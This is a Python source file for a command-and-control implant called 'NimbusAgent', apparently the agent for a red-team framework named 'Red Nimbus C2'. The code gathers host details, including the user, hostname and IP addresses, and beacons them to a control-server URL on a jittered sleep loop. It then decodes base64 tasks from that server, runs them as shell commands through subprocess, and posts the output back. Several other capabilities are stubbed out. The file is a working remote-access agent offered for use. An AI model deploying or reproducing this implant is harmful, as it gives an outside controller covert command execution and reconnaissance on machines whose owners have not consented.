#!/usr/bin/env python3

import argparse
import base64
import getpass
import hashlib
import json
import logging
import os
import random
import socket
import subprocess
import sys
import time
import platform

from urllib import request, parse


# get the API key and URL values
# after you deploy the AWS infrastructure
# either hard code here or overwrite
# using the CLI
API_KEY = "changeme"
URL = "http://127.0.0.1/changeme"


class NimbusAgent:
    def __init__(self, args):

        self.hostname = self.get_hostname()
        self.os_name = self.get_os_name()
        self.os_ver = self.get_os_ver()
        self.kernel_ver = self.get_kernel_ver()
        self.system_time = self.get_system_time()
        self.agent_pid = self.get_pid()
        self.agent_parent_pid = self.get_parent_pid()
        self.proc_name = self.get_proc_name()
        self.agent_dir = self.get_agent_dir()
        self.working_dir = self.get_working_dir()
        self.username = self.get_username()
        self.internal_ip = self.get_internal_ip()
        self.external_ip = self.get_external_ip()
        self.sleep_interval = ""
        self.kill_date = ""
        self.task = ""
        self.task_output = ""

    def get_session_id(self):
        """
        generate a unique session ID
        based on hostname, curent user,
        and current working directory
        """
        hostname = self.get_hostname()
        user = self.get_username()
        cwd = self.get_agent_dir()
        seed = hostname + user + cwd
        session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
        return session_id

    def get_hostname(self):
        return platform.node()

    def get_os_name(self):
        return platform.platform()

    def get_os_ver(self):
        return platform.release()

    def get_kernel_ver(self):
        return platform.version()

    def get_system_time(self):
        return time.ctime()

    def get_pid(self):
        return os.getpid()

    def get_parent_pid(self):
        return os.getppid()

    def get_proc_name(self):
        return sys.argv[0]

    def get_agent_dir(self):
        return os.getcwd()

    def get_working_dir(self):
        return os.getcwd()

    def set_working_dir(self, path: str):
        os.chdir(path)
        self.working_dir = path

    def get_username(self):
        return getpass.getuser()

    def get_internal_ip(self):
        return socket.gethostbyname(socket.gethostname())

    def get_external_ip(self):
        external_ip = ""
        try:
            with request.urlopen('https://ifconfig.me/') as response:
                html = response.read()
                external_ip = html.decode("utf-8")
        except:
            logging.error("unable to get external ip address")
        return external_ip

    def get_sleep_interval(self):
        jitter = random.uniform(1.0, 5.0)
        return float(self.sleep_interval) + jitter

    def set_sleep_interval(self, i):
        self.sleep_interval = i
        return

    def get_kill_date(self):
        return self.kill_date

    def set_kill_date(self, date_unix_epoc):
        self.kill_date = date_unix_epoc

    def check_kill_date(self):
        logging.warning("sorry, this function is not implemented")

# -=-=-=-=-=-=-=-=-=-=-=-=-=
#   Task Commands
# -=-=-=-=-=-=-=-=-=-=-=-=-=

    def get_tasking(self):
        get_task_url = URL + "get"
        tasking = ""
        logging.debug(f"sending get_tasking request to: {get_task_url}")
        try:
            # convert agent class members to JSON
            post_data = json.dumps(self.__dict__)

            # send POST request to control server
            req = request.Request(get_task_url, bytes(post_data, "utf-8"))
            resp = request.urlopen(req)

            # read response
            html = resp.read()
            tasking = html.decode("utf-8")
            logging.debug(tasking)
        except Exception as e:
            logging.error(e)
            return ""

        return tasking

    def post_tasking_output(self, task, task_output):

        post_task_url = URL + "out"

        self.task = task
        self.task_output = task_output

        logging.debug(
            f"sending post_tasking_output request to: {post_task_url}")
        try:
            # convert agent class members to JSON
            post_data = json.dumps(self.__dict__)

            # send POST request to control server
            req = request.Request(post_task_url, bytes(post_data, "utf-8"))
            resp = request.urlopen(req)

            # read response
            html = resp.read()
            response = html.decode("utf-8")
            logging.debug(response)

        except Exception as e:
            logging.error(e)
            self.task = ""
            self.task_output = ""
            return ""

        self.task = ""
        self.task_output = ""

    def exec_tasking(self, task):
        logging.debug("sending task to appropriate handler")

        output = ""
        if task["task"] == "exec-cmd":
            output = exec_cmd(task)

        else:
            logging.warning("received invalid task command:")
            print(task["task"])

        return output


def derive_session_id(hostname: str, user: str, cwd: str, agent_pid) -> str:
    """
    generate a unique session ID
    based on hostname, curent user,
    and current working directory
    """
    seed = hostname + user + cwd + str(agent_pid)
    session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
    return session_id


def decode_task(task):
    logging.debug("base64 decoding agent task")

    # base64 decode the task
    try:
        decoded = base64.b64decode(task)
    except Exception as e:
        logging.error(e)
        return ""

    # convert the task to dict
    decoded = json.loads(decoded.decode("utf-8"))
    return decoded


# -=-=-=-=-=-=-=-=-=-=-=-=-=
#   Agent Commands
# -=-=-=-=-=-=-=-=-=-=-=-=-=

def download_file(url, dst):
    return "sorry this feature is not implemented"


def upload_file(url, src):
    return "sorry this feature is not implemented"


def exec_cmd(task):

    output = ""

    cmd = task["arguments"]
    cmd = ' '.join(cmd)

    if cmd == "":
        logging.debug("received an empty task")
        output = "received call to 'exec-cmd' with no arguments."
        return output

    logging.debug(f"executing task: {cmd}")

    try:
        output = subprocess.getoutput(cmd)
    except Exception as e:
        logging.error(e)
        return ""

    return output


def list_files(dir):
    return "sorry this feature is not implemented"


def list_files_recursive(dir):
    return "sorry this feature is not implemented"


def exec_library(library, function, args):
    return "sorry this feature is not implemented"


def exec_shellcode(shellcode):
    return "sorry this feature is not implemented"


def terminate_session():
    return "sorry this feature is not implemented"


def main(args):

    # setup console logging
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG,
                            format='%(levelname)s (%(filename)s:%(lineno)s) %(message)s')
        logging.debug("enabled verbose console logging")

    else:
        logging.basicConfig(level=logging.INFO,
                            format='%(levelname)s (%(filename)s:%(lineno)s) %(message)s')

    # create agent class
    agent = NimbusAgent(args)

    # pass CLI args to agent
    if args.url != "":
        logging.debug(f"setting url to {args.url}")
        global URL
        URL = args.url

    if args.api_key != "":
        global API_KEY
        API_KEY = args.api_key

    agent.set_sleep_interval(args.sleep_interval)
    agent.set_kill_date(args.kill_date)

    # display agent settings for debugging purposes
    agent_settings = json.dumps(vars(agent), indent=4)
    logging.info("agent settings:")
    print(agent_settings)
    session_id = derive_session_id(
        agent.hostname, agent.username, agent.agent_dir, agent.agent_pid)
    print(f"session ID: {session_id}")

    while True:
        # check kill date
        logging.debug("checking kill date")
        #agent.check_kill_date()

        # sleep
        logging.debug(f"sleeping for {agent.get_sleep_interval()}")
        time.sleep(agent.get_sleep_interval())

        # check if tasking
        logging.debug("getting task from Red Nimbus C2")
        task = agent.get_tasking()

        task_output = ""
        if not task:
            logging.debug("did not receive a task, restarting C2 loop")
            continue
        else:
            logging.debug(f"received new task: {task}")
            task = decode_task(task)

            task_output = agent.exec_tasking(task)

            agent.post_tasking_output(task, task_output)


        # sleep again
        time.sleep(agent.get_sleep_interval())


if __name__ == "__main__":
    # setup CLI
    parser = argparse.ArgumentParser()

    # define agent-related arguments
    parser.add_argument("-u", "--url", required=False, default="")
    parser.add_argument("-a", "--api-key", required=False, default="")
    parser.add_argument("-s", "--sleep-interval",
                        required=False, default="1.0")
    parser.add_argument("-k", "--kill-date", required=False, default="0")

    # define general arguments
    parser.add_argument("-v", "--verbose", action="store_true")

    # parse CLI args
    args = parser.parse_args()

    main(args)
